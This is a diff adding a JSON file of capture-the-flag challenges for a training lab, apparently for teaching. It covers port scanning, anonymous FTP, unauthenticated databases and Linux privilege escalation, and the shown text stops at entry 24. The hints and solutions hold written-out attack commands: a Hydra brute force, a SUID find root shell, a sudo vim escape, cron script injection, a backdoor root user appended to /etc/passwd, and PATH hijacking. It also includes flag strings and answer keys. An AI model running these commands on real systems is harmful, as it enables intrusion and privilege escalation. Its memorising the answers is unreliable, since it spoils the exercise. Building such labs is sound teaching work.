@@ -1,0 +1,902 @@
+[
+  {
+    "id": 1,
+    "title": "Open Port Discovery",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Every hacker starts with reconnaissance. InnovateTech has servers running on the network. Your first task is to find ALL open ports on the target machine. One of those ports hides a secret service with a flag.",
+    "target": "TARGET_IP (use your machine's IP or localhost)",
+    "tools": ["nmap"],
+    "flag": "FLAG{p0rt5_4r3_d00r5_t0_vuln5}",
+    "hints": [
+      "Port scanning is the first step in any security assessment. Use nmap to discover open ports.",
+      "Try scanning ALL ports, not just common ones. The flag is on a non-standard port. Command: nmap -p- TARGET_IP",
+      "The hidden service is on port 8888. Connect to it using: nc localhost 8888 — read the banner that appears."
+    ],
+    "solution": "Step 1: Run a full port scan:\n  nmap -sV -p- localhost\n\nStep 2: Notice port 8888 is open.\n\nStep 3: Connect to it:\n  nc localhost 8888\n\nStep 4: Read the banner — the flag is displayed there.\n\nReal-world lesson: Attackers ALWAYS scan for open ports first. Every open port is a potential entry point. Close ports you don't need!",
+    "solution_locked": true
+  },
+  {
+    "id": 2,
+    "title": "FTP Anonymous Login",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "The company's FTP server is running. Many older FTP servers allow 'anonymous' login — meaning ANYONE can connect without a password. This was once common for public file sharing but became a major security risk.",
+    "target": "localhost:21",
+    "tools": ["ftp", "netcat"],
+    "flag": "FLAG{4n0n_ftp_s3rv3r_l34k5_d4t4}",
+    "hints": [
+      "FTP stands for File Transfer Protocol. Many servers allow 'anonymous' access — try it! Connect with: ftp localhost",
+      "When FTP asks for a username, type 'anonymous'. For password, type anything (or your email). Then use 'ls' to list files.",
+      "After connecting anonymously, type 'ls' to see files, then 'get flag.txt' to download it, then 'quit' and 'cat flag.txt' to read it."
+    ],
+    "solution": "Step 1: Connect to FTP:\n  ftp localhost\n\nStep 2: Enter credentials:\n  Name: anonymous\n  Password: anything@email.com\n\nStep 3: List files:\n  ftp> ls\n\nStep 4: Download the flag:\n  ftp> get flag.txt\n  ftp> quit\n\nStep 5: Read it:\n  cat flag.txt\n\nReal-world lesson: Anonymous FTP is extremely dangerous. Attackers can download sensitive files, or worse, upload malware. Always disable anonymous FTP!",
+    "solution_locked": true
+  },
+  {
+    "id": 3,
+    "title": "Service Banner Grabbing",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "When you connect to a service, it often sends a 'banner' — a welcome message that reveals what software is running and its version. Attackers use this to find known vulnerabilities for that specific version.",
+    "target": "localhost:22",
+    "tools": ["netcat", "nmap"],
+    "flag": "FLAG{b4nn3r5_r3v34l_v3rs10n5}",
+    "hints": [
+      "When you connect to port 22 (SSH), the server sends information about itself. Use netcat (nc) to read it.",
+      "Command: nc localhost 22 — Read the first few lines that appear. The banner contains version info AND the flag.",
+      "The flag is embedded directly in the SSH banner. Just run: nc localhost 2222 and read the output."
+    ],
+    "solution": "Step 1: Use netcat to grab the SSH banner:\n  nc localhost 2222\n\nStep 2: Read the banner that appears immediately. It will contain:\n  - SSH version\n  - Server info\n  - The flag: FLAG{b4nn3r5_r3v34l_v3rs10n5}\n\nAlternative using nmap:\n  nmap -sV -p 2222 localhost\n\nReal-world lesson: Never expose version information in banners. Attackers use tools like Shodan.io to find servers with specific vulnerable versions and mass-exploit them.",
+    "solution_locked": true
+  },
+  {
+    "id": 4,
+    "title": "DNS Zone Transfer",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "DNS is like the internet's phonebook — it maps domain names to IP addresses. A 'zone transfer' is meant for DNS servers to sync with each other, but if misconfigured, ANYONE can download all DNS records, revealing the entire internal network structure.",
+    "target": "localhost:5353",
+    "tools": ["dig", "nslookup"],
+    "flag": "FLAG{axfr_dump5_4ll_dns_r3c0rd5}",
+    "hints": [
+      "DNS zone transfer uses the AXFR query type. The company domain is 'innovatetech.local'.",
+      "Use the 'dig' command with AXFR type: dig AXFR innovatetech.local @localhost -p 5353",
+      "Run: dig AXFR innovatetech.local @127.0.0.1 -p 5353 — Look for a TXT record that contains the flag."
+    ],
+    "solution": "Step 1: Attempt DNS zone transfer:\n  dig AXFR innovatetech.local @127.0.0.1 -p 5353\n\nStep 2: Review ALL records that come back. Look for:\n  - A records (IP addresses of servers)\n  - TXT records (often contain flags or sensitive info)\n  - CNAME records (aliases)\n\nStep 3: Find the TXT record containing the flag.\n\nReal-world lesson: Zone transfers should ONLY be allowed from trusted secondary DNS servers, never from any IP. This exposes: all internal server names, IPs, and infrastructure layout.",
+    "solution_locked": true
+  },
+  {
+    "id": 5,
+    "title": "Subdomain Enumeration",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "Companies often have many subdomains (admin.company.com, dev.company.com, staging.company.com) that aren't publicly listed. Finding these 'hidden' subdomains can reveal unprotected admin panels, development environments, or backup servers.",
+    "target": "innovatetech.local",
+    "tools": ["gobuster", "ffuf", "nmap"],
+    "flag": "FLAG{h1dd3n_subd0m41ns_3xp0s3d}",
+    "hints": [
+      "Use a subdomain enumeration tool. First add to /etc/hosts: '127.0.0.1 innovatetech.local'. Then try common subdomains like admin, dev, staging, api.",
+      "Try gobuster: gobuster dns -d innovatetech.local -w /usr/share/wordlists/dirb/common.txt --resolver 127.0.0.1:5353",
+      "The subdomain 'admin.innovatetech.local' exists. Add it to /etc/hosts and visit it in your browser. Also check: dev, staging, api, backup."
+    ],
+    "solution": "Step 1: Add to /etc/hosts:\n  echo '127.0.0.1 innovatetech.local admin.innovatetech.local' >> /etc/hosts\n\nStep 2: Enumerate subdomains:\n  gobuster dns -d innovatetech.local -w /usr/share/wordlists/dirb/common.txt --resolver 127.0.0.1:5353\n\nStep 3: Visit found subdomains in your browser or with curl:\n  curl http://admin.innovatetech.local\n\nStep 4: The flag is on the admin subdomain page.\n\nReal-world lesson: Always enumerate subdomains during assessments. Companies forget old dev/staging environments that still have default passwords or debug features enabled.",
+    "solution_locked": true
+  },
+  {
+    "id": 6,
+    "title": "Redis Without Authentication",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Redis is a popular in-memory database used for caching, sessions, and more. By default (in older versions), Redis has NO authentication. An exposed Redis server can lead to full server compromise — attackers have used it to write SSH keys and gain root access!",
+    "target": "localhost:6379",
+    "tools": ["redis-cli", "netcat"],
+    "flag": "FLAG{r3d1s_n0_p4ssw0rd_m34ns_d4t4_3xp0s3d}",
+    "hints": [
+      "Redis listens on port 6379. Connect using redis-cli: redis-cli -h localhost",
+      "Once connected, use 'KEYS *' to list all keys stored in Redis. Then use 'GET keyname' to read values.",
+      "Run: redis-cli -h localhost KEYS * — then: redis-cli -h localhost GET FLAG"
+    ],
+    "solution": "Step 1: Connect to Redis:\n  redis-cli -h localhost\n\nStep 2: List all keys:\n  127.0.0.1:6379> KEYS *\n\nStep 3: Get the flag:\n  127.0.0.1:6379> GET FLAG\n\nBonus - check cached credentials:\n  127.0.0.1:6379> GET admin:password\n  127.0.0.1:6379> HGETALL user:cache:999\n\nReal-world lesson: In 2018, over 72,000 Redis servers were exposed online without authentication. Attackers wrote cronjobs/SSH keys via Redis to get full server access. ALWAYS password protect Redis and bind it to 127.0.0.1 only!",
+    "solution_locked": true
+  },
+  {
+    "id": 7,
+    "title": "MongoDB No Authentication",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "MongoDB is a popular NoSQL database. Older versions had no authentication enabled by default, leading to the exposure of MILLIONS of records worldwide. This was called the 'MongoDB Apocalypse' in 2017.",
+    "target": "localhost:27017",
+    "tools": ["mongosh", "mongo"],
+    "flag": "FLAG{m0ng0_n04uth_m34ns_d4t4_l34k}",
+    "hints": [
+      "MongoDB runs on port 27017. Connect using: mongosh localhost:27017 (or mongo if older version)",
+      "Once connected, use 'show dbs' to list databases, then 'use flagsdb' to switch, then 'db.flags.find()' to see all documents.",
+      "Full commands: mongosh localhost:27017 → show dbs → use flagsdb → db.flags.find().pretty()"
+    ],
+    "solution": "Step 1: Connect to MongoDB:\n  mongosh localhost:27017\n\nStep 2: List databases:\n  > show dbs\n\nStep 3: Access the flags database:\n  > use flagsdb\n\nStep 4: List all collections:\n  > show collections\n\nStep 5: Dump flag:\n  > db.flags.find().pretty()\n\nAlso check employee data:\n  > use employees\n  > db.users.find().pretty()\n\nReal-world lesson: The MongoDB Apocalypse (2017) saw attackers ransom 28,000+ MongoDB instances. They deleted data and demanded Bitcoin. Check your database bindings and ALWAYS enable authentication!",
+    "solution_locked": true
+  },
+  {
+    "id": 8,
+    "title": "MySQL Direct Connection",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "MySQL (the world's most popular database) should NEVER be directly exposed to the internet. This server has MySQL running with default root credentials AND it's accessible from outside. This is a critical misconfiguration.",
+    "target": "localhost:3306",
+    "tools": ["mysql"],
+    "flag": "FLAG{mysql_p0rt_3306_n3v3r_publ1c}",
+    "hints": [
+      "MySQL runs on port 3306. Try connecting with default credentials: mysql -h localhost -u root -p",
+      "Try password 'root' when prompted. Then use 'SHOW DATABASES;' to see all databases.",
+      "Full command: mysql -h 127.0.0.1 -u root -proot -e 'SELECT * FROM innovatetech.flags;'"
+    ],
+    "solution": "Step 1: Connect to MySQL:\n  mysql -h 127.0.0.1 -u root -proot\n\nStep 2: List databases:\n  mysql> SHOW DATABASES;\n\nStep 3: Use the database:\n  mysql> USE innovatetech;\n\nStep 4: List tables:\n  mysql> SHOW TABLES;\n\nStep 5: Get the flag:\n  mysql> SELECT * FROM flags;\n\nStep 6: Also check for sensitive data:\n  mysql> SELECT * FROM users;\n\nReal-world lesson: MySQL port 3306 must NEVER be internet-facing. Use firewall rules, VPNs, or SSH tunneling. Always change default credentials. The root user should have a strong password and be restricted to localhost.",
+    "solution_locked": true
+  },
+  {
+    "id": 9,
+    "title": "HTTP Response Headers Audit",
+    "category": "Network",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "HTTP response headers often leak sensitive information: server software versions, framework names, and sometimes even flags left by developers. Attackers always check headers before proceeding with an attack.",
+    "target": "http://localhost",
+    "tools": ["curl", "Burp Suite"],
+    "flag": "FLAG{h34d3rs_t3ll_53cr3t5}",
+    "hints": [
+      "Use curl with the -I flag to see only headers: curl -I http://localhost",
+      "Look at ALL headers in the response. Pay attention to unusual ones like X-Powered-By, Server, and any custom X- headers.",
+      "Run: curl -I http://localhost and look for a custom header named 'X-Secret-Flag' in the response."
+    ],
+    "solution": "Step 1: Get HTTP headers:\n  curl -I http://localhost\n\nStep 2: Look for the X-Secret-Flag header.\n\nStep 3: Also check verbose mode:\n  curl -v http://localhost 2>&1 | grep -i 'x-'\n\nAlso check what the server reveals:\n  Server: nginx/1.19.0  ← version disclosure\n  X-Powered-By: PHP/7.2.0  ← old PHP version!\n  X-Secret-Flag: FLAG{...}\n\nReal-world lesson: Remove version info from headers using 'server_tokens off' in Nginx. Add security headers: X-Frame-Options, Content-Security-Policy, X-XSS-Protection, Strict-Transport-Security.",
+    "solution_locked": true
+  },
+  {
+    "id": 10,
+    "title": "Elasticsearch Open Access",
+    "category": "Network",
+    "difficulty": "Intermediate",
+    "points": 150,
+    "description": "Elasticsearch, a powerful search engine, has had many instances exposed without authentication. In 2019, over 1.2 BILLION records were found in an exposed Elasticsearch cluster. Find and query the running Elasticsearch instance.",
+    "target": "localhost:9200",
+    "tools": ["curl", "browser"],
+    "flag": "FLAG{3l4st1c_n0_4uth_1nd3x_3xp0s3d}",
+    "hints": [
+      "Elasticsearch runs a REST API on port 9200. Try: curl http://localhost:9200",
+      "List all indices: curl http://localhost:9200/_cat/indices?v — find any 'internal' or 'secret' indices.",
+      "Query the internal-secrets index: curl http://localhost:9200/internal-secrets/_search?pretty"
+    ],
+    "solution": "Step 1: Check if Elasticsearch is running:\n  curl http://localhost:9200\n\nStep 2: List all indices:\n  curl http://localhost:9200/_cat/indices?v\n\nStep 3: Find sensitive indices (look for 'internal-secrets').\n\nStep 4: Query it:\n  curl http://localhost:9200/internal-secrets/_search?pretty\n\nStep 5: Read the flag from the response.\n\nReal-world lesson: The 2019 'Collection #1' breach exposed 773 million records via misconfigured Elasticsearch. Always enable X-Pack security, use authentication, and never expose Elasticsearch to the internet.",
+    "solution_locked": true
+  },
+  {
+    "id": 11,
+    "title": "SSH Default Credentials",
+    "category": "Server & Linux",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "SSH (Secure Shell) is how admins connect to Linux servers. But what if the server still uses default credentials? Many IoT devices, routers, and even cloud servers are compromised this way. Connect to the SSH server using default credentials.",
+    "target": "localhost:2222",
+    "tools": ["ssh"],
+    "flag": "FLAG{ssh_d3f4ult_cr3d5_4r3_d34dly}",
+    "hints": [
+      "Try common default credentials. SSH port is 2222. Command: ssh -p 2222 user@localhost",
+      "Try these common default combos: user:password, admin:admin, root:root, user:user123, user:password123",
+      "The credentials are user:password123. After login, look for flag.txt: cat ~/flag.txt"
+    ],
+    "solution": "Step 1: Connect with default credentials:\n  ssh -p 2222 user@localhost\n  Password: password123\n\nStep 2: Read the flag:\n  cat ~/flag.txt\n  cat /home/user/flag.txt\n\nStep 3: Explore the system:\n  id\n  whoami\n  ls -la\n\nReal-world lesson: In 2016, the Mirai botnet compromised 600,000 IoT devices using 61 default username/password combinations. The result? A massive DDoS attack that took down Twitter, Netflix, and Reddit. ALWAYS change default credentials!",
+    "solution_locked": true
+  },
+  {
+    "id": 12,
+    "title": "SSH Weak Password (Brute Force)",
+    "category": "Server & Linux",
+    "difficulty": "Beginner",
+    "points": 150,
+    "description": "Automated brute-force attacks try thousands of passwords per second against SSH. The 'admin' account on this server uses a password from the famous 'rockyou.txt' wordlist. Find it using Hydra.",
+    "target": "localhost:2222",
+    "tools": ["hydra", "medusa"],
+    "flag": "FLAG{w34k_p455w0rd5_4r3_3z_br34k}",
+    "hints": [
+      "Use Hydra to brute-force the SSH password for user 'admin'. The password is in the rockyou wordlist.",
+      "Command: hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222 -t 4",
+      "Hint: The password is 'iloveyou'. Use: ssh -p 2222 admin@localhost with password 'iloveyou', then cat ~/flag.txt"
+    ],
+    "solution": "Step 1: Run Hydra brute force:\n  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://localhost -s 2222 -t 4\n\nStep 2: Wait for it to find the password (iloveyou).\n\nStep 3: Login:\n  ssh -p 2222 admin@localhost\n  Password: iloveyou\n\nStep 4: Get the flag:\n  cat ~/flag.txt\n\nReal-world lesson: Shodan.io shows millions of SSH servers online. Automated bots scan the ENTIRE internet for SSH and try common passwords 24/7. Use SSH key authentication, disable password auth, and use fail2ban to block repeated failures.",
+    "solution_locked": true
+  },
+  {
+    "id": 13,
+    "title": "SUID Binary Exploitation",
+    "category": "Server & Linux",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "SUID (Set User ID) is a Linux permission that allows a file to run with the permissions of its OWNER rather than the person running it. If 'find' or 'vim' has SUID set as root, a regular user can use it to become root!",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "find", "linux commands"],
+    "flag": "FLAG{su1d_b1n4r13s_4r3_pr1v_3sc}",
+    "hints": [
+      "After logging in as 'user', find SUID binaries: find / -perm -4000 -type f 2>/dev/null",
+      "Look for unusual SUID binaries like 'find', 'vim', 'python', 'nmap'. The 'find' command here has SUID set.",
+      "Exploit SUID find: /usr/bin/find . -exec /bin/bash -p \\; — this gives you a root shell. Then: cat /root/flag_suid.txt"
+    ],
+    "solution": "Step 1: Login as user:\n  ssh -p 2222 user@localhost (password: password123)\n\nStep 2: Find SUID binaries:\n  find / -perm -4000 -type f 2>/dev/null\n\nStep 3: Notice /usr/bin/find has SUID bit set (owned by root).\n\nStep 4: Exploit it using GTFOBins technique:\n  /usr/bin/find . -exec /bin/bash -p \\;\n\nStep 5: You now have a root shell!\n  whoami  # shows root\n  cat /root/flag_suid.txt\n\nReal-world lesson: Check your Linux systems for unnecessary SUID binaries regularly. Reference: https://gtfobins.github.io — a database of Unix binaries that can bypass security restrictions.",
+    "solution_locked": true
+  },
+  {
+    "id": 14,
+    "title": "Sudo Misconfiguration",
+    "category": "Server & Linux",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "sudo allows users to run specific commands as root. But if misconfigured with NOPASSWD or overly broad permissions, it becomes a direct path to privilege escalation. Check what commands you can run with sudo.",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "sudo"],
+    "flag": "FLAG{sud0_n0p4sswd_1s_r00t}",
+    "hints": [
+      "After logging in, check your sudo permissions: sudo -l",
+      "Look for any NOPASSWD entries. If you can run /bin/bash or /usr/bin/vim as root without password, you can escalate.",
+      "Run: sudo /usr/bin/vim and then type :!/bin/bash to get a root shell. Then: cat /root/flag_sudo.txt"
+    ],
+    "solution": "Step 1: Login and check sudo permissions:\n  ssh -p 2222 user@localhost\n  sudo -l\n\nStep 2: Notice the entry:\n  (root) NOPASSWD: /usr/bin/vim\n\nStep 3: Launch vim as root:\n  sudo /usr/bin/vim\n\nStep 4: From within vim, escape to shell:\n  :!/bin/bash\n\nStep 5: Get root flag:\n  cat /root/flag_sudo.txt\n\nAlternative: sudo /usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nReal-world lesson: Every entry in /etc/sudoers is a potential privilege escalation path. Never use NOPASSWD for powerful binaries. Reference: https://gtfobins.github.io for sudo escape techniques.",
+    "solution_locked": true
+  },
+  {
+    "id": 15,
+    "title": "Cron Job Privilege Escalation",
+    "category": "Server & Linux",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "Cron jobs are scheduled tasks. If root runs a script that's writable by regular users, those users can modify the script to run any command as root! Check running cron jobs and find the vulnerability.",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "crontab", "ps", "find"],
+    "flag": "FLAG{cr0n_j0b_wr1t3_4nd_0wn}",
+    "hints": [
+      "Check cron jobs: cat /etc/crontab and ls /etc/cron.d/. Look for scripts run by root that are world-writable.",
+      "Find world-writable files: find / -writable -type f 2>/dev/null | grep -v proc",
+      "The file /opt/cleanup.sh is run by root every minute but is world-writable. Edit it to add: cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash — then wait a minute and run: /tmp/rootbash -p"
+    ],
+    "solution": "Step 1: Login as user.\n\nStep 2: Check cron jobs:\n  cat /etc/crontab\n  ls -la /etc/cron.d/\n\nStep 3: Find world-writable script run by root:\n  ls -la /opt/cleanup.sh  # owned root but writable by all\n\nStep 4: Inject payload:\n  echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/cleanup.sh\n\nStep 5: Wait 60 seconds for cron to run.\n\nStep 6: Execute your SUID bash:\n  /tmp/rootbash -p\n  cat /root/flag_cron.txt\n\nReal-world lesson: Cron job abuse is a classic privilege escalation technique. Always check: 1) Script permissions, 2) Directory permissions (if script references a dir), 3) Libraries the script imports.",
+    "solution_locked": true
+  },
+  {
+    "id": 16,
+    "title": "World-Writable /etc/passwd",
+    "category": "Server & Linux",
+    "difficulty": "Intermediate",
+    "points": 200,
+    "description": "/etc/passwd stores user account information. Historically it also stored password hashes, but those moved to /etc/shadow. If /etc/passwd is world-writable, you can add a new root user without needing the current root password!",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "openssl", "echo"],
+    "flag": "FLAG{wr1t4bl3_p455wd_1s_g4m3_0v3r}",
+    "hints": [
+      "Check /etc/passwd permissions: ls -la /etc/passwd — if it's writable by everyone, it's a critical vulnerability.",
+      "Generate a password hash: openssl passwd -1 -salt xyz mypassword — then add a new root user to /etc/passwd.",
+      "Run: echo 'hacker:$(openssl passwd -1 -salt xyz 1234):0:0:root:/root:/bin/bash' >> /etc/passwd then: su hacker"
+    ],
+    "solution": "Step 1: Check permissions:\n  ls -la /etc/passwd\n  # You'll see: -rw-rw-rw- (world writable!)\n\nStep 2: Generate password hash:\n  openssl passwd -1 -salt hack password123\n  # Returns: $1$hack$...\n\nStep 3: Add backdoor root user:\n  echo 'pwned:$1$hack$YOURHASH:0:0:root:/root:/bin/bash' >> /etc/passwd\n\nStep 4: Switch to new root user:\n  su pwned\n  (enter: password123)\n\nStep 5: You are root!\n  cat /root/flag_passwd.txt\n\nReal-world lesson: /etc/passwd should ALWAYS be 644 (owner write only). Check with: stat /etc/passwd. The password hashes should be in /etc/shadow which is 640 root:shadow.",
+    "solution_locked": true
+  },
+  {
+    "id": 17,
+    "title": ".bash_history Credential Leak",
+    "category": "Server & Linux",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "The .bash_history file records all commands a user has typed. Developers often accidentally type passwords directly in commands (like mysql -p'actualpassword') which gets saved to history. Check it for leaked credentials!",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "cat"],
+    "flag": "FLAG{h1st0ry_l34k5_s3cr3t5}",
+    "hints": [
+      "After logging in, check the bash history: cat ~/.bash_history",
+      "Look through the commands for anything that looks like credentials — database connections, API keys, passwords typed in command line.",
+      "Check the history file and look for mysql or curl commands with passwords. The flag is the password for the admin MySQL user you'll find there."
+    ],
+    "solution": "Step 1: Login as user, then check history:\n  cat ~/.bash_history\n  cat /home/devops/.bash_history  (check other users too)\n\nStep 2: Look for commands with credentials:\n  mysql -u admin -p'SecretDB@2024'  ← credential leak!\n  curl -u admin:P@ssw0rd123 http://internal-api/\n\nStep 3: The flag is embedded in the history file.\n\nBest practices:\n  - Add 'HISTSIZE=0' to .bashrc to disable history\n  - Or set HISTCONTROL=ignorespace (prefix commands with space)\n  - NEVER type passwords in command line arguments\n  - Use password managers and config files with restricted permissions\n\nReal-world lesson: During penetration tests, .bash_history often reveals database passwords, API keys, and internal system addresses.",
+    "solution_locked": true
+  },
+  {
+    "id": 18,
+    "title": "Environment Variable Secrets",
+    "category": "Server & Linux",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "Applications often store secrets in environment variables (API keys, database passwords). These can be readable by all processes running as the same user, and sometimes visible to other users through /proc!",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "env", "printenv"],
+    "flag": "FLAG{3nv_v4r5_4r3_n0t_s3cr3t}",
+    "hints": [
+      "After logging in, list all environment variables: env | printenv — look for anything that looks like a secret.",
+      "Also check /proc for other processes' environment: cat /proc/1/environ | tr '\\0' '\\n'",
+      "Run: printenv | grep -i 'secret\\|key\\|flag\\|password\\|token' — one of the env vars contains the flag."
+    ],
+    "solution": "Step 1: List environment variables:\n  env\n  printenv\n\nStep 2: Search for secrets:\n  printenv | grep -i 'secret\\|flag\\|key\\|pass'\n\nStep 3: Find SECRET_FLAG or API_KEY variable with the flag.\n\nStep 4: Also check other process environments:\n  cat /proc/1/environ | tr '\\0' '\\n' | grep -i flag\n\nReal-world lesson: Environment variables are NOT secret — they're visible to processes and often logged by monitoring tools. Use secrets management tools like HashiCorp Vault, AWS Secrets Manager, or Kubernetes Secrets (with encryption at rest).",
+    "solution_locked": true
+  },
+  {
+    "id": 19,
+    "title": "PATH Variable Hijacking",
+    "category": "Server & Linux",
+    "difficulty": "Advanced",
+    "points": 250,
+    "description": "When you run a command without specifying its full path (like just 'ls' instead of '/bin/ls'), Linux searches the PATH variable directories in order. If an attacker can write to a directory that appears BEFORE /bin in PATH, they can hijack commands!",
+    "target": "SSH into localhost:2222 as user:password123",
+    "tools": ["ssh", "bash", "which"],
+    "flag": "FLAG{p4th_h1j4ck_g4v3_m3_r00t}",
+    "hints": [
+      "Check the PATH variable and look for a sudo script: echo $PATH — notice if /tmp or /home/user is before /usr/bin",
+      "Find scripts that use relative commands: look in /opt/ for scripts run by root. They might call 'backup' without full path.",
+      "Create a malicious 'backup' script in /tmp: echo '#!/bin/bash\\ncp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh' > /tmp/backup && chmod +x /tmp/backup — then run the sudo script with modified PATH."
+    ],
+    "solution": "Step 1: Check for vulnerable scripts:\n  cat /opt/backup_script.sh\n  # It calls 'service backup start' without full path!\n\nStep 2: Check if you can sudo the script:\n  sudo -l  # shows (root) NOPASSWD: /opt/backup_script.sh\n\nStep 3: Create malicious 'service' in /tmp:\n  echo '#!/bin/bash' > /tmp/service\n  echo 'cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh' >> /tmp/service\n  chmod +x /tmp/service\n\nStep 4: Run sudo with modified PATH:\n  sudo PATH=/tmp:$PATH /opt/backup_script.sh\n\nStep 5: Get root shell:\n  /tmp/rootsh -p\n  cat /root/flag_path.txt\n\nReal-world lesson: Always use absolute paths in scripts run with elevated privileges. Never have /tmp or user-writable dirs in PATH.",
+    "solution_locked": true
+  },
+  {
+    "id": 20,
+    "title": "Exposed SSH Private Key",
+    "category": "Server & Linux",
+    "difficulty": "Intermediate",
+    "points": 150,
+    "description": "SSH private keys are like master passwords. They should NEVER be stored in accessible locations. Developers sometimes leave private keys in web directories, backup folders, or public repositories. Find the exposed key and use it!",
+    "target": "localhost:2222 and http://localhost",
+    "tools": ["curl", "ssh", "find"],
+    "flag": "FLAG{priv4t3_k3y_l3ft_1n_publ1c}",
+    "hints": [
+      "Check the web server for exposed sensitive files. Try: curl http://localhost/.ssh/id_rsa or look in /backup/",
+      "Developers often put backups in /backup/. Try: curl http://localhost/backup/ and look for .pem or .key files.",
+      "The key is at http://localhost/backup/id_rsa — download it, chmod 600 it, then: ssh -i id_rsa root@localhost -p 2222"
+    ],
+    "solution": "Step 1: Find the exposed private key:\n  curl http://localhost/backup/id_rsa\n\nStep 2: Save and set correct permissions:\n  curl http://localhost/backup/id_rsa -o id_rsa\n  chmod 600 id_rsa\n\nStep 3: Use it to SSH as root:\n  ssh -i id_rsa root@localhost -p 2222\n\nStep 4: Get the flag:\n  cat /root/flag_sshkey.txt\n\nReal-world lesson: In 2019, a developer accidentally committed an AWS private key to GitHub. Within 4 minutes of the commit, automated bots found it and used it to spin up Bitcoin mining servers costing thousands of dollars. NEVER put private keys in web directories or version control!",
+    "solution_locked": true
+  },
+  {
+    "id": 21,
+    "title": "robots.txt Hidden Paths",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "robots.txt tells search engines which pages NOT to index. But it also tells attackers exactly which pages the company is trying to hide! Checking robots.txt is always the first step in web reconnaissance.",
+    "target": "http://localhost",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{r0b0t5_txt_1s_4_r0adm4p}",
+    "hints": [
+      "Check the robots.txt file at the root of the website: http://localhost/robots.txt",
+      "robots.txt lists paths that search engines should ignore — but it's publicly readable! Look for 'Disallow:' entries.",
+      "Visit each path listed in Disallow entries. One of them contains a secret file with the flag."
+    ],
+    "solution": "Step 1: Visit robots.txt:\n  curl http://localhost/robots.txt\n\nStep 2: Read all Disallow entries:\n  Disallow: /admin-secret-panel/\n  Disallow: /backup/\n  Disallow: /secret-flag/\n  Disallow: /.env\n\nStep 3: Visit each path:\n  curl http://localhost/secret-flag/\n  curl http://localhost/admin-secret-panel/\n\nStep 4: Find the flag at one of these hidden paths.\n\nReal-world lesson: robots.txt is public! Never list sensitive directories there. Instead, use proper authentication and authorization. Many bug bounty hunters find goldmines in robots.txt.",
+    "solution_locked": true
+  },
+  {
+    "id": 22,
+    "title": "Directory Listing Enabled",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "When a web server has directory listing enabled, visitors can browse folders like a file explorer — seeing all files. This can expose configuration files, backups, and sensitive documents. Check the /backup/ directory!",
+    "target": "http://localhost/backup/",
+    "tools": ["browser", "curl", "wget"],
+    "flag": "FLAG{d1r3ct0ry_l1st1ng_3xp0s3s_f1l35}",
+    "hints": [
+      "Browse to http://localhost/backup/ in your browser — if directory listing is on, you'll see a file list.",
+      "Look through the listed files for anything sensitive: credentials, backups, config files, or flag files.",
+      "The file you're looking for is in http://localhost/backup/ — browse the directory and download interesting-looking files."
+    ],
+    "solution": "Step 1: Visit the backup directory:\n  curl http://localhost/backup/\n  # Or open in browser: http://localhost/backup/\n\nStep 2: You'll see a directory listing with files.\n\nStep 3: Download and read sensitive files:\n  curl http://localhost/backup/database_backup.sql\n  curl http://localhost/backup/config.bak\n  curl http://localhost/backup/flag.txt\n\nReal-world lesson: Disable directory listing in Nginx with 'autoindex off;' (default). In Apache, remove 'Indexes' from Options. Many database backups, config files with passwords, and source code have been exposed this way.",
+    "solution_locked": true
+  },
+  {
+    "id": 23,
+    "title": "Default Admin Credentials",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 100,
+    "description": "The admin panel for InnovateTech's website uses default credentials that were never changed. Admin panels are high-value targets — gaining access means controlling the entire application.",
+    "target": "http://localhost/admin",
+    "tools": ["browser", "curl"],
+    "flag": "FLAG{d3f4ult_cr3d5_4r3_4_g1ft}",
+    "hints": [
+      "Visit http://localhost/admin — you'll see a login form. Try the most common defaults.",
+      "Common admin credentials: admin/admin, admin/password, admin/admin123, administrator/password. Try them!",
+      "The credentials are admin / admin123. Login and look in the dashboard for the flag."
+    ],
+    "solution": "Step 1: Visit admin panel:\n  http://localhost/admin\n\nStep 2: Try default credentials:\n  Username: admin\n  Password: admin123\n\nStep 3: After login, look for the flag in the admin dashboard.\n\nStep 4: Explore the admin panel for:\n  - User data\n  - Configuration settings\n  - Other flags\n\nReal-world lesson: Default credentials are so common that Mirai botnet included 61 hard-coded username/password pairs. Always: 1) Change defaults immediately, 2) Use strong passwords, 3) Enable MFA on admin panels, 4) Restrict admin panel access by IP.",
+    "solution_locked": true
+  },
+  {
+    "id": 24,
+    "title": "SQL Injection - Login Bypass",
+    "category": "Web Security",
+    "difficulty": "Beginner",
+    "points": 150,
